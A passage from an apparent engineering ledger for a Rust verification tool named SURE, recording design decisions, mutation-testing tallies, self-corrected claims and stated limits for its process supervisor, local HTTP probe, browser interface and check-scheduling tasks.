  control**: a service gets the default of `ProcessRequest`,
  `Environment::inherited()`, so a variable in SURE's own environment reaches the
  project — which is what makes a real service find its tools, and is also the wrong
  shape for confining one; `Environment::only` is one layer down for whoever closes
  it. **No restart and nothing watching the watcher**: `has_finished()` is how a
  caller finds out, and nothing calls it on the caller's behalf. **And the logs
  arrive once, at the end, not as they are written** — that is the design of
  `process` and not a choice made here, and a caller that needs a service's output
  while it is still up is asking for something this build does not have.

- **The child program is a copy of the test binary wearing another name, and the
  limitation is written down rather than hidden.** `safety::classify` reads the last
  path component, so the test binary's own name classifies as unknown and is never
  admitted; naming the copy `python.exe` on Windows and `python` elsewhere makes it
  admissible through the real classification rather than around it. The limitation
  is that a name can be moved between files, which is a fact about names and not a
  hole in this test — and it is stated in the module doc of the test file, where the
  next person to write one will read it.

- **Four instruments, because "it was stopped" is not one fact.** `.started` says
  the process was live; the report is written **only on release**, so its absence
  says the service never finished; `.abandoned` is the third state and is explicitly
  not to be confused with either; and `.beating`, a heartbeat rewritten on every
  poll, is the only instrument available in the drop test — which gets no outcome to
  read, because dropping a `Service` stops it *and* discards the handle that would
  have reported what came of it.

- **Seven mutations, seven caught, and one test holds three of them.** m1 the
  callback before the spawn, m2 the callback never, m3 dropping a service stops
  nothing, m4 the wait before the cancel, m5 `has_finished` always true, m6 the
  limits that do not reach the run, m7 the working directory ignored. **Every
  mutation was caught by exactly one test**, and
  `a_service_starts_is_stopped_and_both_of_its_streams_are_kept` is the one for m4,
  m5 and m6. **That concentration is recorded because it is the shape a future
  deletion would exploit**: the suite is not redundant here, and one test is
  load-bearing for three properties at once.

- **The `.cmd`/`.bat` question cannot arise in this task, and the reason is
  structural rather than lucky.** `safety::classify` returns
  `Classification::unread(BATCH_FILE)` for `.cmd`/`.bat`, so a batch file is never
  admitted in any mode under any permission set — held by
  `a_batch_file_is_refused_in_every_mode_and_never_admitted` in `enforce.rs` — and a
  `Supervisor` cannot be handed one, because `start` only takes what was admitted.
  **`HANDOFF.md` item 19 has predicted twice that this task would meet the question
  and leave it open; it does not meet it at all.** The task that does is still to be
  seen, and the item is corrected rather than left standing.

- **A false red on macOS, from comparing two spellings of one directory, and the
  precedent that was already in the repository.** The assertion *"a service runs in
  the directory its supervisor was given"* compared the child's
  `std::env::current_dir()` — resolved through every symlink — against a path built
  from `std::env::temp_dir()`, which is not. Run `34952200942` was
  **windows success, ubuntu success, macOS failure**, and the macOS log named the
  assertion: `/private/var/folders/…` against `/var/folders/…`, the same directory,
  because `/var` is a symlink to `/private/var`. **The service was right and the
  test was wrong** — a false *red*, which is the mirror of the false green this
  product exists to prevent, and it is recorded for the same reason: an assertion
  that fails for a reason unrelated to its claim teaches a reader to distrust the
  suite. **`P3-T001`'s `process_runner.rs` asserts this exact claim about this exact
  runner and canonicalizes both sides**, with a comment explaining that Windows
  returns the same directory with a different drive-letter case. **That comment
  gives one platform's reason for a rule that holds on every platform**, and the
  next file to compare a directory copied the shape and not the rule. The fix adopts
  the idiom, and the comment now names both cases, because **a reason scoped to the
  platform that produced it is how the next file gets this wrong again.**

- **What is not established.** **Nothing about a real service**: every test starts a
  copy of the test binary, so nothing here has started a server, and the claim is
  about supervision rather than about any particular daemon. **Nothing about
  readiness or ports** — that is the question of `P3-T010`, and the module has no
  method that could be mistaken for an answer. **Nothing about the process tree of a
  real service**: the tree-stop path belongs to `process` and is tested there; this
  module asks for it and does not re-verify it. **Nothing about a caller in the
  product**: the `CEILING` in `sure-core::support` is still `InspectOnly`, because
  nothing in the product builds a `Supervisor` — the runner has a caller now, and
  that caller has none.

## P3-T010 — the local probe, five variants of which one is an answer, and a mutation the platform hid

Acceptance: *"Probe records concrete response/outcome."* and *"Open port alone
is not feature completeness."*

- **The second acceptance sentence is answered by keeping the port question off
  the verdict path, which is the same move `P3-T009` made one module over.**
  `ProbeOutcome` has five variants — `Refused`, `Unreachable`, `NoAnswer`,
  `NotHttp`, `Answered` — and `is_an_answer` is true for exactly one. **The
  module does have a boolean that asks whether the port is open** —
  `opened_a_connection`, true for `NoAnswer` — **and no verdict reads it**:
  `status()` is an exhaustive match on the variant, with no `_` arm, so a caller
  who learns the port is open still cannot turn that into a pass and a new
  variant is a compile error rather than a silent route onto the green path.
  *Something accepted the connection and said nothing* is `NoAnswer`, which maps
  to `CheckStatus::Unknown` and is therefore **not checked** by `aggregate`. A
  critical port-only probe cannot aggregate to green, and
  `an_open_port_that_says_nothing_does_not_aggregate_to_green` measures that
  through `aggregate` rather than through this module's own enum — the claim is
  about the verdict, not about which variant came back.

  **This bullet said "there is no boolean anywhere in the module" when it was
  first written, and that was false.** The claim was checkable in one command and
  was not checked until a grep for `pub fn … -> bool` returned two hits, one of
  which — `opened_a_connection` — is exactly the port question the sentence said
  could not be asked. The same false sentence was in the module's rustdoc header,
  where it would have shipped as crate documentation, and in `HANDOFF.md`. **All
  three are corrected and the correction is a commit of its own**, because a
  claim a reader can check and the code contradicts is worse than a missing
  claim: it reads as a defence that was built when it was only a sentence.

- **A zero timeout makes no attempt, and the reason is a pass it would otherwise
  produce.** Three implementations were considered and two are wrong. Rounding a
  zero budget up to a millisecond is enough time for a loopback socket to connect
  and a small service to answer, so **"spend no time at all" would have reported
  a green check** — the one outcome this product may not manufacture. Passing the
  zero to `TcpStream::connect_timeout` is worse: the platform rejects it, and the
  caller is told the operating system refused something the caller had already
  asked not to happen. A zero budget is therefore `Unreachable` with a reason
  naming the budget, which is `CheckStatus::Error` and never aggregates to green.
  **A zero *byte* bound is deliberately not treated the same way**, and the
  asymmetry is stated in the module: with nothing kept, no header block can be
  found, so a zero bound cannot reach a pass and needs no special case.

- **A port that answers in a protocol that is not HTTP is `NotHttp`, and it is
  decided from the first byte rather than from the blank line.** This started as
  a bug and the bug is the interesting part. A port speaking TLS, probed with a
  plaintext request, answers with a binary record that contains **no CRLF at
  all**, and a service whose protocol name does not begin with `H` is
  contradicted by its first byte — under a reader that waited for `\r\n\r\n`,
  both were reported as *a port that said nothing*, which is the least useful
  thing a report can say about a port that answered.
  `could_still_be_a_status_line` reads the same grammar as `parse_status_line` as
  a condition on a prefix, so the first line is settled as soon as its bytes can
  no longer begin a status line. **The same predicate ends the read**, so a TLS
  port does not cost the whole timeout either. That second half was found by a
  test asserting on elapsed time, which failed at 5.0s against a five-second
  hold: **the outcome was right and the deadline had produced it**, which is the
  class of bug a value-only assertion cannot see.

- **`CheckResult::unknown` is new in `sure-domain`, and it is the only status
  whose evidence class is a parameter.** The frozen vocabulary exposed
  `CheckStatus::Unknown` with no constructor; this is the first check that needs
  one. The parameter is the whole of what separates it from `not_run`: **here
  SURE has evidence and the evidence supports no verdict; there SURE has none.**
  Its own test pins that it carries the class it was given and no
  `not_checked_reason`, because two results differing only in their
  `CheckStatus` would be a distinction a report could not explain.

- **`verdict` claimed to be "written against" `status()` while re-implementing
  the same match.** The doc said the two *cannot* disagree; they were two
  statements of one rule held together by nothing. `verdict` now calls `status()`
  and the claim is true. The catch-all `_` arm became an explicit
  `Error | Warning | Skipped` arm so that adding a variant to `CheckStatus` is a
  **compile error in this file** rather than a silent mis-mapping.

- **A mutation survived the integration suite, and what it took to catch it is
  the finding of this task.** `m8` deleted the `WouldBlock` arm of `is_a_timeout`
  and **all twenty integration tests passed**. That is not a gap in the tests but
  a gap in the platform: Windows reports an expired socket read timeout as
  `TimedOut`, a Unix reports the same condition as `WouldBlock`, so **no test
  reachable from a socket on this machine can produce the Unix spelling**. The
  arm was held by nothing here, and without it a Unix build reports a port that
  said nothing as a port that *could not be reached* — an observation about the
  project turned into a failure of the probe, on two of the three CI platforms.
  It is now held by a unit test in the module, which can run on all three, and
  that test is the only thing in `sure-core` that catches it. **The harness's own
  filter was the second half of the finding**: `--test probe_local_service`
  selects an integration target and does not run the lib, so the first re-run
  after adding the unit test still reported a survivor — a mutation reported as
  surviving under a filter that could not have run the test that kills it is a
  measurement of the filter.

- **Eleven mutations, ten caught, seven of those ten by exactly one test each —
  and two of those seven share a test.** `m5` (widening `is_an_answer`) and `m7`
  (replacing the silence reason) both land on
  `an_open_port_that_says_nothing_does_not_aggregate_to_green`, which is also the
  test the acceptance is about. **Ten-for-ten would be true about the caught set
  and misleading about the task**, because the eleventh is the one that survived
  and the concentration is the shape a future deletion would exploit; both are
  recorded rather than summarised.

- **Three things the first draft got wrong that the tests caught, none of which
  a green suite would have surfaced.** The byte bound was a *soft* bound —
  checked between reads, so a 4 KiB chunk could put **1024 body bytes under a
  512-byte bound**; it is now what is kept, exactly, and the test asserts the
  arithmetic rather than a range. The first line of a never-ending reply is
  "whatever arrived", up to the whole bound, so a report could have carried sixty
  kilobytes of lossy-decoded binary; it is now cut at 120 bytes with the cut
  marked, so a cut line cannot read as a whole one. And an early-break guard on
  `header_block_end` was written, reasoned about and **removed**: the predicate
  reads only as far as the code token, so a valid status line satisfies it
  however long the buffer is, and the guard changed no behavior the tests could
  see. Its comment now says why no guard is needed rather than claiming a
  condition that does nothing.

- **A free loopback port can accept a connection, and the probe reported its own
  request line as the reply.** This is the task's second real bug and it was
  found by **a run that could not have caused it**: `0eb1ac3` changes one doc
  comment, and its run `34956776646` came back **windows `failure`, macos
  `success`, ubuntu `success`** on
  `a_port_with_nothing_behind_it_is_refused_rather_than_unreachable`, whose
  message read `NotHttp { first_line: "GET / HTTP/1.1" }` — **the bytes the probe
  had written**. When the operating system hands the dialled port out as the
  **source** port of the connection, the connection loops back on itself and
  everything written arrives in its own receive queue. Nothing is listening; the
  probe talked to itself. **It is not a Windows quirk** — it is documented TCP
  behaviour — and on loopback the giveaway is exact: **a real connection's local
  port can never equal the port it dialled**, because that port is held by
  whichever socket is listening, so it cannot also be an ephemeral source port.
  Unfixed, SURE tells a project with a free port that its service *"did not start
  with an HTTP status line"* — a false statement about the project produced by
  an artefact of the kernel. `is_a_self_connect` is checked between the connect
  and the write and maps to `Refused`, which is the same fact `ECONNREFUSED`
  carries and the same `fail`. **The test was right and the product was wrong**,
  which is the second time in this task the suite was ahead of the code.

- **The predicate is tested and the branch that uses it is not, and that is
  measured rather than hoped.** The unit test is deterministic on all three
  platforms because it takes the two addresses directly. **The `get()` branch
  cannot be exercised on demand**, and the mutation that deletes it — `m11` —
  **survived the whole `sure-core` suite**, exactly as the test run immediately
  before that commit did. Forcing a self-connect means asking the operating
  system to choose a particular port, and it does not choose on request:
  dialling ports that had just been released produced **0 self-connects in 40
  attempts**, and the same measurement showed a refused connect on this machine
  takes about **2.04 seconds** to come back — so a brute-force search is not a
  test but a timeout, and a retry loop would have hidden the gap instead of
  naming it.

- **The budget covers the connect, and a refusal is slower than a connect, so a
  short budget turns an observation into a tool failure.** A budget below the
  platform's refusal latency reports `Unreachable` — the probe's own failure, an
  `error` — where a longer one reports `Refused`, which is a `fail` about the
  project. **Both are non-green**, so this cannot manufacture the false green the
  module exists to prevent; what changes is which of two sentences a report
  prints, and only the longer budget prints the one about the project. It is
  stated in `get`'s documentation **without a number**, because the latency
  belongs to the platform, and the measurement that found it belongs here rather
  than in a doc comment.

- **What is not established.** **Nothing about whether the feature works**: a
  pass means a request was answered, the title names the request
  (`local probe: GET /health HTTP/1.1 answered`) and a test asserts it does not
  say "works" or "ready". **No body is parsed, decoded or matched**, so
  `body_bytes` counts what arrived after the header block — the body for an
  identity-encoded response, and including chunk framing for a chunked one.
  **No header is parsed, `Content-Length` least of all**: the end of a response
  is the end of the connection and nothing else, so a service that keeps its
  socket open is `truncated` after costing the whole timeout even when it sent a
  complete body. **Nothing here is asynchronous**, and one probe blocks for up to
  its timeout. **Nothing about a hostile peer**: every server in the tests is one
  this repository wrote, and what a peer that lies in its headers can make a
  reader do is out of scope for a reader that parses no header.

## P3-T011 — the browser interface, a false green found in the type rather than the mapping, and a scope limit that was one word away

Acceptance: *"Browser unavailable => skipped/unknown."* and *"Browser automation
is isolated from core verdict semantics."*

- **The first sentence is a value, not an error path.** `Report` is
  `Absent(Absence) | Observed(Observation)`; `AbsenceReason` has five variants,
  each maps to a `NotCheckedReason`, and **all five map to `CheckStatus::Skipped`
  — asserted by looping over `AbsenceReason::ALL`** rather than over the
  variants a test author thought of, so a sixth reason added later that landed on
  a `pass` fails rather than ships. `Absence` is a struct with a reason and the
  detail that produced it; there is no `Result` anywhere in the interface,
  because "there is no browser" is not an error and the type should not make a
  caller handle it as one.

- **Four of the five reasons block green, and that is the reading of the
  acceptance sentence.** A missing browser is not a scope limit: the domain's own
  definition is *"that the user chose or that the project shape implies"*, and
  **neither half holds for a machine with no browser on it** — so a critical
  browser check that could not run keeps the run out of green instead of
  disappearing politely. The fifth reason, the project switching the check off,
  *is* a scope limit and stops the check blocking; **it does not make the run
  green**, which is the correction to a first draft of this bullet that assumed
  it did: `aggregate` keeps an out-of-scope critical check visible, so the run
  lands on `NeedsAttention` (or `NotEnoughChecked` when nothing ran at all) and
  the report still says the interface was not looked at.

- **`UnsupportedPlatform` was written as `UnsupportedStack` and that was one word
  away from a silent hole.** `UnsupportedStack` is a scope limit, so a critical
  browser check on an operating system SURE cannot drive a browser on would have
  **stopped blocking green** — the report would have carried a reassuring status
  for the exact case where SURE knows least. The mapping is now
  `ToolUnavailable` for `NoDriverInstalled`, `DriverWouldNotStart` *and*
  `UnsupportedPlatform`: three names, one group (*no way to drive a browser
  here*), and the difference survives in `plain_explanation`, which is the
  sentence a reader actually sees. **A user who does not want the browser check
  holding their run back has a way to say so**, and it is the one that says it out
  loud: `checks.browser_probe: never`.

- **The false green was in the interface, and no mapping could have fixed it.**
  A page served a **404** renders, has a title, reports no console errors and
  loads completely — every field of an `Observation` adds up to a pass about a
  page that was never served. The mapping was not wrong; **a driver had no way to
  say the status**, so the type was the defect. `document_status: Option<u16>` is
  now part of `Observation`, and **`None` is `Unknown` rather than a pass** — the
  same technique as `ProbeOutcome::NoAnswer`, where staying silent is not an
  answer. A driver therefore cannot reach green by omitting the field and does
  not have to lie to avoid it.

- **The window is the local probe's window, and the tie is a sweep rather than a
  shared function.** `a_page_could_be_shown` restates `ProbeOutcome::status`'s
  200–399 guard, and
  `the_page_status_window_is_the_local_probes_window` **sweeps every status from
  100 to 599 asserting the two agree**. Two spellings and a test, rather than one
  function, because the probe's is a guard on an enum variant inside a `const fn`
  and this one is a question about a number a driver reported. **`m11` moved the
  probe's own window to 200–500 and the sweep caught it** — which is the property
  that makes two spellings acceptable here instead of a drift waiting to happen.
  Writing it as one function was tried first and clippy rejected the shared
  spelling for the non-`const` call site, which is what produced the pair in the
  first place.

- **The isolation is a source check, because an absence cannot be run.** A
  driver's signature has no way to return a verdict: `BrowserDriver::observe`
  returns `Report`, neither variant contains a `CheckStatus` or a `CheckResult`,
  and `tests/browser_probe.rs` **parses the trait's own body and asserts it names
  neither**. The stronger form is the count: `-> CheckResult` and `-> CheckStatus`
  each appear **exactly once** in the shipped part of the module, so a second
  door is a failing test rather than a second opinion. **`m5` added exactly such
  a function and was caught only there** — the 611 tests in the library target
  were silent, which is the measurement that justifies the source check existing.

- **What the isolation does not claim, stated where the claim is.** The interface
  keeps a driver from **spelling** a verdict; it does not keep a driver from being
  **wrong**. A driver that reports `complete: true` and no problems about a page
  that threw has lied, and nothing in the module can tell. The direction that is
  enforced is the one that matters — *no driver can hand SURE a status, so no
  driver can put a green in a report by asking for one* — and the observations
  themselves are checked by a second driver, not by this file. Writing the limit
  down next to the mechanism is the same discipline as `P3-T010`'s correction: a
  claim a reader can check, and the code does not contradict.

- **`Target` wraps `probe::Endpoint` rather than restating the loopback rule.**
  One refusal rule in the codebase, not two that agree today. It matters more
  here than in the probe: **a browser navigates to the internet happily**, so a
  subject built from a `String` would make a browser check into an
  `ExternalService` action under a permission SURE asked for on the understanding
  that the target was local. The scheme is not a parameter and there is no
  constructor that takes one.

- **Nothing is implemented, and the rule that says so is meant to fail.**
  `nothing_in_the_product_can_drive_a_browser_today` names the files that may name
  `BrowserDriver`, and **`P5-T004` is where it will fail** — the adapter depends
  on this task, and that commit is where somebody reads the paragraph. The second
  half of the rule is behavioural rather than textual:
  `decide(BrowserProbe, InspectOnly, inspect_only())` is `Denied`, so the mode
  the product defaults to refuses the action before any question about a browser
  is reached.

- **Twelve mutations, twelve caught, eleven by exactly one test each.** `m2` and
  `m2b` split the two `Unknown` guards apart one at a time, so that neither is
  covered by the other's test — the first draft had them as one condition and one
  mutation would have covered both halves. `m5` and `m11` are the two the
  library target cannot see, and they are the two that justify the integration
  file existing.

- **"Ten by exactly one test each" was written here and in `be02100`'s own commit
  message, and it is wrong — the number is eleven.** The count was right when it
  was written: the set was `m1` through `m11`, `m1` was caught by two tests, and
  the other **ten** were caught by one. Then `m2` was split into `m2` and `m2b`
  and the set became twelve, and **the sentence describing the set was not in the
  set** — nothing in the harness reads the prose that counts its mutations, so the
  re-run that caught all twelve reported twelve and the words still said ten.
  **This is the same defect this file has recorded four times from the other
  direction**: not a parse that fails into a smaller plausible answer, but a
  number that was true of a smaller set and outlived it. It was found by re-running
  the mutations rather than by reading the sentence, which is the only way it
  could have been found — **the prose and the evidence were both on disk and only
  one of them could disagree with the harness.** `be02100` is pushed and its
  message cannot be rewritten; the correction lives here, and the counts in
  `HANDOFF.md` and in `progress/state.json` are measured from
  `target/tmp/p3t011-mutations.log` rather than copied from the message.

- **The same acceptance found the same defect a second time, one field over, and
  it was a number belonging to a different task.** The first draft of the record
  said `browser.rs` was *"959 lines of implementation plus 302 of its own tests"*.
  Measured, it is **843 lines above its `#[cfg(test)]` and 418 below it, 1261 in
  all**. **The 959 is `probe.rs`** — `P3-T010`'s file, whose accepted-work entry one
  screen up reads *"+818, then +49, then +15 −8, then +86 −1: 959 lines"* — and it
  was carried across and used as this module's size. **The 302 is then only the
  remainder**, `1261 − 959`, and it never described anything at all: `probe.rs`'s
  own test block is **69 lines**, so the borrowed figure was not even borrowed
  whole. Nothing had computed a split for `browser.rs`; a shape that looked right
  in the neighbouring paragraph was written down and read as this task's. **A count
  copied from an adjacent entry is worse than a missing one**, because a missing
  count is visibly missing and a copied one is a claim about a file the reader will
  not open — and the arithmetic agreeing, `959 + 302 = 1261`, is exactly what made
  it survive a reading. Both errors were caught the same way, by measuring at the
  moment of writing rather than at the moment of reading, and **both belong to
  `P3-T011`'s acceptance rather than to `P3-T011`**, which is where the interest
  lies: the work was correct, and the ledger about the work was wrong twice, in two
  different fields, and neither was wrong in a way the code could have caught.

## P4-T001 — the schedule that is not the plan, a sentence a user would have read, and the mutation that survived because a predicate had no test of its own

Acceptance: *"Ordered plan includes reason, evidence class and execution
requirements per check."*

- **The acceptance names something the frozen `CheckPlan` cannot hold, and that is
  the first decision in the task.** `CheckPlan` is `id`, `fingerprint`, `mode`, a
  list of static check ids, a list of dynamic check ids and the exclusions —
  **identifiers and nothing else**, because adding a field to it is an ADR-level
  decision. It therefore cannot carry a reason or an evidence class. The thing
  this task builds is a **schedule**: SURE's own account of what a run intends to
  check, with the reason, the evidence class and the execution requirements on
  each entry. [`CheckSchedule::planned_checks`] is the **one** bridge from the
  schedule to `Enforcement::of`, so the order a report shows is decided in one
  place rather than re-derived by each caller. **The two words are kept apart
  because they answer different questions**: a schedule is what a run *intends*,
  a plan is what a mode *allowed*, and the frozen record is downstream.

- **"Ordered" means a function of the checks, and it is held over all 120
  permutations of a five-check set.** Three rules, applied in order, the last of
  which makes the order total: checks that run nothing come first; then by
  severity, worst first; then by identifier, smallest first. The sweep **collects
  the orders it visited rather than counting them**, because a permutation sweep
  is exactly the kind of loop whose failure is a smaller, plausible answer — 24
  iterations that produced one permutation 24 times would pass a count. Rule 3 is
  inside the comparison rather than a second pass, so the identifier is the *last*
  word: a `sort_by_key` on the first two rules would leave equal checks in
  submission order, which is the order the module promises not to depend on.

- **The mode is deliberately not an ordering rule, and there is a test whose only
  job is that.** `ExecutionDecision` is not a property of a check; it is the
  answer to a question asked *about* one under a particular mode and permission
  set. Folding it into the ordering would mean the same checks came back in two
  different orders depending on how they were about to be run, so a caller
  comparing an inspect-only plan with a host-confirmed one could no longer tell
  **a changed decision from a reshuffled plan**. The decisions are on the entries
  and `the_order_does_not_move_when_the_mode_does_but_the_decisions_do` keeps them
  there. **That test also corrected the module's own prose**: the first draft of
  rule 2 said `Severity`'s variant order was the *inverse* of `rank`, and
  `Severity`'s `Ord` is written by hand and already agrees with it — so the two
  are now **asserted** to agree (`Severity::ALL.windows(2)`) rather than assumed
  to, which is `P3-T008`'s repair applied one field over.

- **A check that cannot run is still in the plan, and the only status this module
  can produce is a `Skipped` one.** Dropping a blocked entry would produce a plan
  that reads as complete while something in it never happened, which is the one
  outcome this repository exists to avoid. A blocked entry keeps its decision and
  the permission that stopped it, `CheckSchedule::blocked` is the complement of
  `may_run`, and `ScheduledCheck::not_run` returns `None` for a check that would
  run — so a caller cannot get a *pass* out of a schedule entry. It sets
  `EvidenceClass::Unknown` because the domain's `CheckResult::not_run` does and
  documents why: a check that did not run established nothing, and offering a
  choice would only offer a way to write that down wrongly.

- **A false sentence was on course to be shown to a user, and the test that found
  it was written for a different reason.** `permissions_missing` filtered on
  `!decide(..).is_allowed()` — the *decision* — so it listed permissions that were
  **granted** but blocked by the mode, and `plain_description` then told the user
  *"will not run: run_project_code"* about a permission **they had already
  given**. `blocked_by` and `permissions_missing` now filter on the permission set
  and take **no mode at all**: it is a fact about the permission set and the same
  list under every one, and that is the whole of what "denied" means in `decide`.
  `plain_description` has **three** outcomes rather than two, so a mode-blocked
  check says *"will run only if you agree"* and never names a granted permission.
  **The sentence a user reads before deciding is the one place this repository can
  least afford a plausible-looking wrong answer**, and this one was one predicate
  away from shipping.

- **One mutation survived the first run of the set, and the test that kills it
  exists only because of that.** Answering `may_run` from `blocked_by.is_none()`
  instead of from the decision **passed all 630 tests**, because the two agree
  whenever a check is denied a permission — which is every case the existing tests
  reached — and come apart **exactly** where every permission is granted and the
  mode still refuses to run project code. A caller asking `blocked_by` would be
  told the check runs and would produce **no result for it at all**, so the check
  would *vanish from the report* rather than appear as one that did not happen.
  `a_check_the_mode_stops_still_gets_a_result_saying_it_did_not_run` was written
  to hold it and the set was re-run in full against the changed file, so the log
  is one vintage. **The lesson is `P3-T008`'s one field over**: the mutation did
  not find a bug in the code, it found that **a derived predicate had no test of
  its own** three lines below the predicate it derives from. **Nineteen mutations,
  nineteen caught, twelve by exactly one test.**

- **`m2`'s first draft did not compile, and the harness is right to refuse to call
  that a survivor.** Moving `Reverse(severity.rank())` to `severity.rank()`
  without the signature makes the key a `(bool, u8)` where the function promises a
  `Reverse<u8>`, so `cargo` fails before any test runs and `mutate3.py` prints
  **INCONCLUSIVE** — *the suite did not run, so this says nothing either way* —
  which is the line `P3-T011` added for exactly this and which fired here for the
  first time since. **A mutation that does not compile is not a mutation that was
  caught.** The driver also died on its own console output, on the GBK codec, one
  level above the trap `mutate3.py` documents; the console copy is ASCII-escaped
  now and the log keeps the raw text.

- **What this does not do, stated where the code states it.** It does not decide
  which checks exist: there is no catalogue and no rule that derives a check from
  a project, **no shipped code proposes one yet**, and
  `tests/check_schedule.rs` names the files that may construct a `CheckProposal`
  and says it is written to fail on the day `P4-T002`, `P4-T003` or `P4-T004`
  lands the first proposer. It does not run anything — the one mention of
  `std::process::Command` in the module is a doc link, so `tests/spawn_sites.rs`'
  census is unchanged. It does not ask the user anything: `NeedsConsent` is
  reported as `NeedsConsent`, and turning that into a prompt is `crate::consent`'s
  job. And **it says nothing about whether a check is any good** — a caller that
  labels a guess `ObservedFact` has lied in a way this module cannot detect, which
  is the limit `crate::browser` states about its drivers one module over.

## P4-T002 — the frozen vocabulary has no word for "declared and unusable", and the mutation set that found four claims with prose and no test

Acceptance: *"Declared build/lint/type/test checks run only under allowed
execution mode. Missing commands are not passes."*

- **The decision this task had to make and could not avoid: `NotCheckedReason` is
  frozen, and none of its ten variants means what SURE needs to say.** The fact is
  *the project declares this and what it declares is not something SURE can run* —
  `"test": ["jest"]`, or a declared script with no lockfile to say what runs it.
  Three candidates come close and each is false in a way that costs something.
  [`NotApplicable`](NotCheckedReason::NotApplicable) — *"This check does not apply
  to your project."* — is true for a project that declares no command for a role
  and **a lie a person would act on** for one that wrote an unusable one: they
  would not go and look at their manifest.
  [`ToolUnavailable`](NotCheckedReason::ToolUnavailable) is a claim about **the
  machine** and is false whenever `npm` is sitting right there.
  [`UnsupportedStack`](NotCheckedReason::UnsupportedStack) says the project is not
  on a stack SURE can check, which is false — **this is the stack it checks
  best**. What is left is [`UnknownReason`](NotCheckedReason::UnknownReason),
  which is false about **SURE's own state** rather than about the project or the
  machine. **SURE knows exactly why neither ran, and the word a report groups by
  is wrong; the word is still the best of four and that is recorded here rather
  than left in a `match` arm.**

- **The choice is not free, because `is_scope_limit` is load-bearing.** The
  frozen enum's `is_scope_limit` is present or absent on each variant, and
  [`CheckResult::blocks_green`] reads it to decide whether a **critical** check
  that did not run holds the run out of green. `NotApplicable`,
  `UnsupportedStack` and `DisabledByConfiguration` are scope limits; the other
  seven are not. So mapping `NotACommand` and `NoRunner` onto `NotApplicable`
  would not merely be a wrong word — it would **silently stop a broken manifest
  from holding a run out of green**, which is the false green this product exists
  to prevent. `UnknownReason` is the only candidate that does not class a defect
  the user can fix as a scope limit, and `MissingKind::ALL`'s sweep asserts the
  split as a value: `NotDeclared` is the **only** kind whose reason is a scope
  limit. The two fixtures in `tests/node_checks.rs` that differ by exactly one
  script name — `a_project_that_declares_nothing_is_not_a_project_that_fails` and
  `every_role_the_acceptance_names_is_either_a_check_or_a_skipped_result` — are
  what holds the two answers apart.

- **The shape is `crate::browser::AbsenceReason`'s, deliberately: the frozen
  reason is what a report groups by, and SURE's own sentence is what it prints.**
  `MissingKind::plain_explanation` is true for all three kinds and
  `MissingCommand::not_checked` **overwrites** the `reason` field that
  `CheckResult::not_run` filled from the vocabulary — for two of the three kinds
  the generic sentence is false. That assignment is the one line in the module
  that looks like a wart, so
  `the_sentence_a_person_reads_is_not_the_vocabularys_sentence_where_that_one_is_false`
  exists to say what it is for, and the sweep asserts the three sentences are
  three.

- **A check's identifier is derived from the component and the role, and the tag
  is not trusted.** `check_id` digests `(component, tag)` and the readable half is
  the tag with everything outside `[a-z0-9]` dropped, **with the digest taken over
  the raw text** — so `node-test` and `nodetest` read alike and are still two
  checks. The component is in the digest as well as the tag, because the same role
  in two workspace members is two checks; `CheckId::generate` is deliberately
  absent, because a random identifier cannot join a stored result to a later plan
  and that join is the repair contract in `docs/architecture/CHECK_PIPELINE.md`.
  The `# Panics` section of `check_id` is the one place here written as though a
  function cannot fail, and it is **held by a sweep** over components and tags
  with spaces, punctuation, Unicode, path separators, the empty string and lengths
  past the Windows path limit rather than asserted in a sentence.

- **The four roles checked are the acceptance's four, and the four ignored are
  ignored for what they do to a project rather than for how useful they are.**
  `format` and `clean` **write**; `dev` and `start` **do not finish**. Neither is
  a check — there is no question they answer — and `ActionKind` has no variant for
  any of the four, which is the domain saying the same thing. The four weights on
  the roles that remain (build and test `MustFix` and critical; lint
  `CanFixLater`; type check `ShouldFixFirst`) are **a policy and not a
  discovery**: nothing in a `package.json` says how much a lint failure matters.
  That is exactly why the mutation set matters here — see the last item.

- **The first run of the mutation set left four survivors and all four were one
  finding: a claim with prose and no test.** Flipping the lint's weight, flipping
  the type check's criticality, dropping the explanation from
  `MissingCommand::plain_description`, and answering `is_empty` from `proposed`
  alone each **passed the whole suite**, because the prose above the table was the
  only thing that said why the table reads the way it does. The four are now held
  by `the_table_carries_the_four_checks_and_the_weight_this_module_argues_for_each`
  (which pins the whole table as a value), three added assertions in
  `every_missing_command_is_skipped_and_none_of_them_is_a_pass`, and
  `a_project_whose_only_findings_are_gaps_is_not_a_project_with_nothing_to_say`.
  **A policy written only in a comment is a policy nothing enforces**, and the
  type-check weight would have moved without a single test changing colour.

- **The fifth survivor was the test that was written to kill the fourth, and that
  is the more useful lesson.** `a_project_whose_only_findings_are_gaps_is_not_a_project_with_nothing_to_say`
  first used a project with **one** script, so `proposed.is_empty()` was `false`
  under the original and under the mutation alike, and the mutation **survived a
  test written against it**. A test for a conjunction is worth exactly as much as
  the case where the two conjuncts differ; the fixture is now a project that
  declares nothing — no proposals, four gaps — which is the only shape where the
  two readings come apart. The set was re-run in full after each change, so the
  log is one vintage.

- **`mutate3.py` gained `--no-fail-fast`, and the reason is a measurement rather
  than a preference.** `cargo test` stops at the first failing target, so on the
  first run every "caught by" list was a **floor** — whatever the library's own
  binary happened to hold — and the survivors were the only rows that could be
  trusted, because a survivor is the one answer fail-fast cannot fake: a run where
  **every** target ran and passed. With the flag, all 37 targets run for every
  mutation. The final tally is **twenty-three mutations, twenty-three caught,
  eight by exactly one test.**

- **The first proposer in the product is what closed a rule written two tasks
  earlier to fail on this day.** `tests/check_schedule.rs` carried
  `nothing_in_the_product_proposes_a_check_yet`, which walked the source tree and
  asserted that no shipped file constructs a [`CheckProposal`]. It was written to
  fail when `P4-T002`, `P4-T003` or `P4-T004` landed the first proposer, it did
  fail on this task, and the rule is now a `MAY_PROPOSE` list with a second test
  asserting that **every exemption is still a proposer** — so an entry cannot be
  left behind by a file that stopped proposing, which is the way an exemption list
  rots.

## P4-T004 — `cargo fmt` is not a check, a conjunction whose halves cannot disagree, and a doc comment the mutation set found

Acceptance: *"fmt/check/clippy/test evidence binds to current fingerprint."*

- **The decision the second half of that sentence forces: the format check runs
  `cargo fmt --check`, and the title moves with the flag.** `cargo fmt` rewrites
  the source tree, so a check built from it would change the state it was about —
  the fingerprint would be taken before the run and there would be nothing on disk
  afterwards that the result was still true of. *Evidence binds to current
  fingerprint* is therefore not a rule about storing identifiers; it is a
  constraint on which commands may be checks at all. `format_command` appends the
  one flag to the discovery's own string rather than composing a command, so a
  change to what discovery plans moves the check with it, and `titled` gives the
